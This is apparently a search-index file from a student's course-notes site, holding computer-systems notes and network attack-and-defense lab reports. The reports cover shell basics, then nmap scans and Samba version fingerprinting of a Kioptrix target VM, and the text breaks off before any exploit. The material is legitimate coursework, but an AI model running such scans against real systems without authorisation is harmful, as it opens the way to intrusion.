\u5e8f\u5217\uff0c\u90fd\u5b58\u653e\u5728\u5b58\u50a8\u5668\u4e2d\uff0c\u6309\u5730\u5740\u8bbf\u95ee\u3002\u8ba1\u7b97\u673a\u91c7\u7528\u300c\u5b58\u50a8\u7a0b\u5e8f\u300d\u65b9\u5f0f\u8fdb\u884c\u5de5\u4f5c\u3002\u6307\u4ee4\u683c\u5f0f\u4e2d\u5305\u542b\u64cd\u4f5c\u7801\u5b57\u6bb5\u548c\u5730\u5740\u7801\u5b57\u6bb5\u7b49\uff0c\u5730\u5740\u5417\u53ef\u4ee5\u662f\u4e3b\u5b58\u5355\u5143\u53f7\uff0c\u4e5f\u53ef\u4ee5\u662f\u901a\u7528\u5bc4\u5b58\u5668\u7f16\u53f7\uff0c\u7528\u4e8e\u6307\u51fa\u64cd\u4f5c\u6570\u6240\u5728\u7684\u4e3b\u5b58\u5355\u5143\u6216\u901a\u7528\u5bc4\u5b58\u5668\u3002</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf\u4ee5\u9010\u5c42\u5411\u4e0a\u62bd\u8c61\u7684\u65b9\u5f0f\u6784\u6210\uff0c\u901a\u8fc7\u5411\u4e0a\u5c42\u7528\u6237\u63d0\u4f9b\u4e00\u4e2a\u62bd\u8c61\u7684\u7b80\u6d01\u63a5\u53e3\u5c06\u8f83\u4f4e\u5c42\u6b21\u7684\u5b9e\u73b0\u7ec6\u8282\u9690\u85cf\u8d77\u6765\u3002\u7cfb\u7edf\u4e2d\u8f6f\u4ef6\u548c\u786c\u4ef6\u4e4b\u95f4\u7684\u62bd\u8c61\u5c42\u5c31\u662f\u300c\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\u300d\uff08ISA\uff09\u3002\u786c\u4ef6\u548c\u8f6f\u4ef6\u76f8\u8f85\u76f8\u6210\uff0c\u7f3a\u4e00\u4e0d\u53ef\uff0c\u4e24\u8005\u90fd\u53ef\u7528\u6765\u5b9e\u73b0\u903b\u8f91\u529f\u80fd\u3002</p> <p>\u8ba1\u7b97\u673a\u5b8c\u6210\u4e00\u4e2a\u4efb\u52a1\u7684\u5927\u81f4\u8fc7\u7a0b\u5982\u4e0b\uff1a\u7528\u67d0\u79cd\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u7f16\u5236\u6e90\u7a0b\u5e8f\uff0c\u7528\u8bed\u8a00\u5904\u7406\u7a0b\u5e8f\u5c06\u6e90\u7a0b\u5e8f\u7ffb\u8bd1\u6210\u673a\u5668\u8bed\u8a00\u76ee\u6807\u7a0b\u5e8f\uff0c\u5c06\u76ee\u6807\u7a0b\u5e8f\u4e2d\u7684\u6307\u4ee4\u548c\u6570\u636e\u88c5\u5165\u5185\u5b58\uff0c\u7136\u540e\u4ece\u7b2c\u4e00\u6761\u6307\u4ee4\u5f00\u59cb\u6267\u884c\uff0c\u77e5\u9053\u7a0b\u5e8f\u4e2d\u7684\u6307\u4ee4\u5168\u90e8\u6267\u884c\u5b8c\u3002\u6bcf\u6761\u6307\u4ee4\u7684\u6267\u884c\u5305\u62ec\u53d6\u6307\u4ee4\u3001\u6307\u4ee4\u8bd1\u7801\u3001PC \u589e\u91cf\u3001\u53bb\u64cd\u4f5c\u6570\u3001\u8fd0\u7b97\u3001\u9001\u7ed3\u679c\u7b49\u64cd\u4f5c\u3002</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/","title":"Ch02 \u6570\u636e\u7684\u673a\u5668\u7ea7\u8868\u793a\u4e0e\u5904\u7406","text":""},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_1","title":"\u6570\u5236\u548c\u7f16\u7801","text":""},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_2","title":"\u4fe1\u606f\u7684\u4e8c\u8fdb\u5236\u7f16\u7801","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_3","title":"\u8fdb\u4f4d\u8ba1\u6570\u5236","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_4","title":"\u5b9a\u70b9\u6570\u4e0e\u6d6e\u70b9\u6570","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_5","title":"\u5b9a\u70b9\u6570\u7684\u7f16\u7801\u8868\u793a","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_6","title":"\u6574\u6570\u7684\u8868\u793a","text":""},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_7","title":"\u65e0\u7b26\u53f7\u6574\u6570\u548c\u5e26\u7b26\u53f7\u6574\u6570","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#c","title":"C \u8bed\u8a00\u4e2d\u7684\u6574\u6570\u53ca\u5176\u76f8\u4e92\u8f6c\u6362","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_8","title":"\u6d6e\u70b9\u6570\u7684\u8868\u793a","text":""},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_9","title":"\u6d6e\u70b9\u6570\u7684\u8868\u793a\u8303\u56f4","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_10","title":"\u6d6e\u70b9\u6570\u7684\u89c4\u683c\u5316","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#ieee-754","title":"IEEE 754 \u6d6e\u70b9\u6570\u6807\u51c6","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#c_1","title":"C \u8bed\u8a00\u4e2d\u7684\u6d6e\u70b9\u6570\u7c7b\u578b","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_11","title":"\u975e\u6570\u503c\u6570\u636e\u7684\u7f16\u7801\u8868\u793a","text":""},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_12","title":"\u903b\u8f91\u503c","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_13","title":"\u897f\u6587\u5b57\u7b26","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_14","title":"\u6c49\u5b57\u5b57\u7b26","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_15","title":"\u6570\u636e\u7684\u5bbd\u5ea6\u548c\u5b58\u50a8","text":""},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_16","title":"\u6570\u636e\u7684\u5bbd\u5ea6\u548c\u5355\u4f4d","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_17","title":"\u6570\u636e\u7684\u5b58\u50a8\u548c\u6392\u5217\u987a\u5e8f","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_18","title":"\u6570\u636e\u7684\u57fa\u672c\u8fd0\u7b97","text":""},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_19","title":"\u6309\u4f4d\u8fd0\u7b97\u548c\u903b\u8f91\u8fd0\u7b97","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_20","title":"\u5de6\u79fb\u548c\u53f3\u79fb\u8fd0\u7b97","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_21","title":"\u4f4d\u6269\u5c55\u548c\u4f4d\u622a\u65ad\u8fd0\u7b97","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_22","title":"\u6574\u6570\u52a0\u51cf\u8fd0\u7b97","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_23","title":"\u6574\u6570\u4e58\u9664\u8fd0\u7b97","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_24","title":"\u5e38\u91cf\u7684\u4e58\u9664\u8fd0\u7b97","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_25","title":"\u6d6e\u70b9\u6570\u8fd0\u7b97","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch02-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/#_26","title":"\u7ae0\u8282\u5c0f\u7ed3","text":"<p>asd</p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/","title":"Index","text":"<p>\u56e0\u4e3a\u7f51\u7edc\u653b\u9632\u5b9e\u6218\uff08Network Attack &amp; Defense\uff09\u662f\u4e00\u95e8\u6240\u89c1\u5373\u6240\u5f97\u7684\u5b9e\u9a8c\u8bfe\u3002</p> <p>\u6240\u4ee5\u8bfe\u4e0a\u8bb2\u7684\u5185\u5bb9\u51e0\u4e4e\u76f4\u63a5\u8f6c\u5316\u6210\u4e86\u5b9e\u9a8c\u62a5\u544a\uff0c\u6545\u800c\u6b64\u5904\u4e0d\u5c55\u793a\u7b14\u8bb0\u800c\u53ea\u5c55\u793a\u5b9e\u9a8c\u62a5\u544a\u3002</p> <p>\u53e6\u5916\u4e3a\u4e86\u5b66\u672f\u8bda\u4fe1\u539f\u5219\uff0c\u5220\u53bb\u4e86\u5176\u4e2d\u6240\u6709\u767b\u5165\u9776\u673a\u7684\u622a\u56fe\uff08\u6b64\u9879\u662f\u4f5c\u4e1a\u6700\u7ec8\u7684\u8981\u6c42\uff09\u3002</p> <p>\u8fd9\u8bfe\u662f\u8d28\u91cf\u975e\u5e38\u9ad8\u7684\u8bfe\u7a0b\uff0c\u8fd9\u9996\u5148\u8981\u611f\u8c22\u672c\u8bfe\u7a0b\u7684\u6388\u8bfe\u6559\u5e08\u9648\u5065\u8001\u5e08\u3002</p> <p>\u5f00\u59cb\u7684\u65f6\u5019\uff0c\u4f60\u53ef\u80fd\u4f1a\u89c9\u5f97\u8fd9\u8bfe\u7a0b\u5728\u8bf4\u4ec0\u4e48\uff0c\u90fd\u542c\u4e0d\u61c2\uff0c\u8fd9\u662f\u56e0\u4e3a\u5176\u4e2d\u7528\u5230\u7684\u77e5\u8bc6\u662f\u4f60\u5927\u4e8c\u5927\u4e09\u8bfe\u7a0b\u5185\u6bd4\u8f83\u57fa\u7840\u7684\u4e00\u4e9b\u5185\u5bb9\u3002</p> <p>\u4f46\u4e5f\u4e0d\u8981\u56e0\u6b64\u7070\u5fc3\uff0c\u56e0\u4e3a\u6211\u5df2\u7ecf\u63d0\u53ca\u5230\u4e86\u8fd9\u4e9b\u5185\u5bb9\u5b9e\u9645\u4e0a\u90fd\u6bd4\u8f83\u57fa\u7840\uff0c\u4f60\u52aa\u529b\u5b66\u4e60\u5230\u8fd9\u4e9b\u77e5\u8bc6\u53ef\u4ee5\u4e3a\u4e4b\u540e\u6253\u4e0b\u57fa\u7840\u3002</p> <p>\u5982\u4f55\u66f4\u597d\u5730\u5b9e\u73b0\u8fd9\u4e00\u70b9\uff0c\u4ee5\u53ca\u5982\u4f55\u901a\u8fc7\u8fd9\u8bfe\u7a0b\uff0c\u6211\u7ed9\u51fa\u4ee5\u4e0b\u4e09\u6761\u5efa\u8bae\uff1a</p> <ol> <li>\u719f\u7ec3\u8be2\u95ee AI\uff0cAI \u867d\u7136\u4e0d\u662f\u795e\u8c15\u673a\uff0c\u4f46\u53ef\u4ee5\u4e3a\u4f60\u6307\u660e\u4e00\u4e2a\u5927\u6982\u7684\u65b9\u5411\uff0c\u8fd8\u6709\u53ef\u80fd\u76f4\u63a5\u5c06\u4f60\u5e26\u79bb\u56f0\u5883\u3002\u56e0\u6b64\u6211\u8981\u7279\u522b\u611f\u8c22 ChatGPT.</li> <li>\u5bfb\u627e CTF \u5927\u795e\uff0c\u4ed6\u4eec\u7684\u6307\u5bfc\u662f\u7edd\u4f73\u7684\u96ea\u4e2d\u9001\u70ad\u3002\u56e0\u6b64\u6211\u8981\u7279\u522b\u611f\u8c22\u6211\u7684\u670b\u53cb Nopthon \u548c\u8d85\u5e7e\u4f55\u6c37\u7cbe.</li> <li>\u5bfb\u627e\u548c\u4f60\u4e00\u8d77\u6253\u9776\u673a\u7684\u670b\u53cb\uff0c\u4ed6\u4eec\u7684\u966a\u4f34\u548c\u601d\u60f3\u78b0\u649e\u4f1a\u4f7f\u4f60\u53d7\u76ca\u826f\u591a\u3002\u56e0\u6b64\u6211\u8981\u7279\u522b\u611f\u8c22\u6211\u7684\u670b\u53cb Celesphonia\uff08J. Zhu\uff09\u548c numberes.</li> </ol>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab1/","title":"Lab1","text":""},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab1/#_1","title":"\u7f51\u7edc\u653b\u9632\u5b9e\u6218","text":""},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab1/#241840273","title":"241840273 \u6768\u826f\u707c","text":"<p>(1) </p> <pre><code>mkdir tmp\ncd tmp\nmkdir test\n</code></pre> <p></p> <p>(2) </p> <pre><code>man touch\n</code></pre> <p></p> <p>(3)</p> <pre><code>cd test\ntouch test\n</code></pre> <p></p> <p>(4)</p> <pre><code>echo -e '#!/bin/sh\\n' &gt; test\necho 'curl --head --silent https://www.nju.edu.cn' &gt;&gt; test\n</code></pre> <p></p> <p>(5)</p> <pre><code>./test\n</code></pre> <p></p> <p>(6)</p> <pre><code>chmod u+rwx test\n</code></pre> <p></p> <p>(7)</p> <p>shebang: sharp(#) + bang(!) or hash(#) + bang(!)</p> <p>\u4ee5\u6307\u4ee4 <code>#!/bin/sh</code> \u5f00\u5934\u7684\u6587\u4ef6\u6267\u884c\u65f6\u4f1a\u5b9e\u9645\u8c03\u7528 <code>/bin/sh</code> \uff0c\u4e5f\u5c31\u662f\u4f7f\u7528\u4e86 sh \u6765\u89e3\u6790.</p> <p>\u6240\u4ee5\u6267\u884c (4) \u4e2d\u7f16\u5199\u7684\u6587\u4ef6\u5b9e\u9645\u4e0a\u5c31\u662f\u8c03\u7528 <code>/bin/sh</code> \u6267\u884c <code>curl</code> \u547d\u4ee4</p> <p>\u4f7f\u7528 <code>man curl</code> \u67e5\u8be2\u5f97\u5230\uff1a</p> <pre><code>--head\n    (HTTP FTP FILE) Fetch the headers only. HTTP-servers feature the command HEAD which this uses to  get  nothing but the header of a document. When used on an FTP or FILE URL, curl displays the file size and last modification time only.\n    Providing --head multiple times has no extra effect. Disable it again with --no-head.\n\n--silent\n    Silent or quiet mode. Do not show progress meter or error messages. Makes curl mute. It still outputs the data you ask for, potentially even to the terminal/stdout unless you redirect it.\n    Use -S, --show-error in addition to this option to disable progress meter but still show error messages.\n    Providing --silent multiple times has no extra effect. Disable it again with --no-silent.\n</code></pre> <p>(8)</p> <pre><code>./test | tail -n 5 &gt; last-5-lines.txt\nnl last-5-lines.txt\n</code></pre> <p></p> <p>\u8fd9\u91cc <code>./test</code> \u8fd4\u56de\u7ed3\u679c\u6700\u540e\u4e00\u884c\u4ec5\u542b\u4e00\u4e2a\u56de\u8f66\uff0c\u6240\u4ee5\u8fd9\u91cc\u770b\u8d77\u6765\u53ea\u6709\u56db\u884c\uff0c\u4f46\u5b9e\u9645\u4e0a\u6709\u4e94\u884c.</p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab2/","title":"Lab2","text":"<p>Network Atk&amp;Def lab2 241840273 \u6768\u826f\u707c</p> <p>\u5b89\u88c5\u597d\u76f8\u5173\u5de5\u5177\uff0c\u5e76\u5728 Virtual Box UI \u754c\u9762\u6dfb\u52a0\u9776\u673a.</p> <p>\u521b\u5efa NAT \u7f51\u7edc\uff0c\u5e76\u5c06\u653b\u51fb\u673a\u548c\u9776\u673a\u7f51\u7edc\u8fde\u63a5\u65b9\u5f0f\u90fd\u6539\u4e3a NAT \u7f51\u7edc\uff0c\u5e76\u8fde\u63a5\u540c\u4e00\u4e2a\u521b\u5efa\u7684 NAT \u7f51\u7edc</p> <ol> <li>\u653b\u51fb\u673a ip \u4f7f\u7528 <code>ifconfig</code> \u67e5\u8be2\uff1a</li> </ol> <pre><code>\u2514\u2500$ ifconfig\neth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 10.0.2.4  netmask 255.255.255.0  broadcast 10.0.2.255\n        inet6 fe80::9d17:dec1:4341:a804  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 08:00:27:3c:97:80  txqueuelen 1000  (Ethernet)\n        RX packets 210  bytes 22077 (21.5 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 2448  bytes 149910 (146.3 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 8  bytes 480 (480.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 8  bytes 480 (480.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n</code></pre> <ol> <li>\u4f7f\u7528 nmap \u626b\u63cf ip</li> </ol> <pre><code>\u2514\u2500$ sudo nmap -sn 10.0.2.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 07:48 EDT\nNmap scan report for bogon (10.0.2.1)\nHost is up (0.00040s latency).\nMAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)\nNmap scan report for bogon (10.0.2.2)\nHost is up (0.00037s latency).\nMAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)\nNmap scan report for 10.0.2.3\nHost is up (0.00032s latency).\nMAC Address: 08:00:27:4F:5B:7F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 10.0.2.7\nHost is up (0.00076s latency).\nMAC Address: 08:00:27:F3:A8:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for bogon (10.0.2.4)\nHost is up.\nNmap done: 256 IP addresses (5 hosts up) scanned in 2.03 seconds\n</code></pre> <ol> <li>\u6ce8\u610f\u5230 <code>10.0.2.7</code> \u4e3a\u9776\u673a ip\uff0c\u6267\u884c <code>nmap -sV -sC 10.0.2.7</code> \u626b\u63cf\u4e4b. \u5176\u4e2d\u6211\u6dfb\u52a0\u4e86 <code>#</code> \u5f00\u5934\u7684\u5355\u884c\u6ce8\u91ca.</li> </ol> <pre><code>\u2514\u2500$ sudo nmap -sV -sC 10.0.2.7\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 07:51 EDT\nNmap scan report for bogon (10.0.2.7)\nHost is up (0.00085s latency).\nNot shown: 994 closed tcp ports (reset)\nPORT      STATE SERVICE     VERSION\n22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n# SSH \u670d\u52a1\n| ssh-hostkey: \n|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)\n|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)\n|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)\n|_sshv1: Server supports SSHv1\n80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n# HTTP \u670d\u52a1\n|_http-title: Test Page for the Apache Web Server on Red Hat Linux\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n| http-methods: \n|_  Potentially risky methods: TRACE\n111/tcp   open  rpcbind     2 (RPC #100000)\n# RPC \u670d\u52a1\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|_  100000  2            111/udp   rpcbind\n139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)\n# Samba \u670d\u52a1\n443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n# HTTPS \u670d\u52a1\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_ssl-date: 2025-10-13T15:52:12+00:00; +4h00m00s from scanner time.\n| sslv2: \n|   SSLv2 supported\n|   ciphers: \n|     SSL2_RC2_128_CBC_WITH_MD5\n|     SSL2_RC4_128_WITH_MD5\n|     SSL2_DES_192_EDE3_CBC_WITH_MD5\n|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5\n|     SSL2_RC4_64_WITH_MD5\n|     SSL2_RC4_128_EXPORT40_WITH_MD5\n|_    SSL2_DES_64_CBC_WITH_MD5\n|_http-title: 400 Bad Request\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Not valid before: 2009-09-26T09:32:06\n|_Not valid after:  2010-09-26T09:32:06\n32768/tcp open  status      1 (RPC #100024)\nMAC Address: 08:00:27:F3:A8:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nHost script results:\n|_smb2-time: Protocol negotiation failed (SMB2)\n|_clock-skew: 3h59m59s\n|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 18.32 seconds\n</code></pre> <p>\u6211\u4eec\u5f97\u77e5\u4e86\u5176\u5404\u4e2a\u670d\u52a1\u7aef\u53e3\uff0c\u540c\u65f6\u5f97\u77e5\u4e86\u9776\u673a\u64cd\u4f5c\u7cfb\u7edf\u4e3a <code>Red-Hat/Linux</code>.</p> <p>\u8003\u8651\u8fdb\u653b\u65b9\u5411\uff0c\u8fd9\u91cc\u8fdb\u653b Samba \u670d\u52a1\uff0c\u4e0d\u8fc7\u6211\u4eec\u4e0d\u77e5\u9053\u5176\u7248\u672c\u53f7.</p> <p>\u6839\u636e SSH \u670d\u52a1\u4e2d\u4f7f\u7528\u7684 OpenSSH 2.9p2 \u7684\u53d1\u884c\u65f6\u95f4\u4e3a 2001 \u5e74 6 \u6708 17 \u65e5\uff08OpenSSH: Release Notes: https://www.openssh.com/releasenotes.html\uff09\uff0cHTTP \u670d\u52a1\u4e2d\u4f7f\u7528\u7684 Apache 1.3.20 \u7684\u53d1\u884c\u65f6\u95f4\u4e3a 2001 \u5e74 5 \u6708 22 \u65e5\uff08Apache Week. Apache 1.3.20 released: http://www.apacheweek.com/issues/01-05-25\uff09\uff0c\u6545\u800c\u731c\u6d4b Samba \u7684\u7248\u672c\u53f7\u53d1\u884c\u65f6\u95f4\u4e0e\u4e8c\u8005\u76f8\u8fd1.</p> <p>\u641c\u7d22\u53d1\u73b0\u67e5\u8be2 Samba \u9760\u8fd1\u90a3\u4e2a\u65f6\u95f4\u70b9\u7684\u7248\u672c\u53d1\u884c\u65e5\u671f\uff1a</p> \u5e8f\u53f7 Samba \u7248\u672c\u53f7 \u53d1\u884c\u65f6\u95f4 \u76f8\u5173\u94fe\u63a5 1 2.0.7 2000-04-26 www.linuxtoday.com/developer/appwatch-samba-2-0-7-released/ 2 2.2.0 2001-04-19 www.linuxtoday.com/infrastructure/whats-new-in-samba-2-2/ 3 2.2.1 2001-07-10 https://www.samba.org/samba/history/samba-2.2.1.html 4 2.2.2 2001-10-13 https://www.samba.org/samba/history/samba-2.2.2.html 5 2.2.3 2002-02-02 https://www.samba.org/samba/history/samba-2.2.3.html 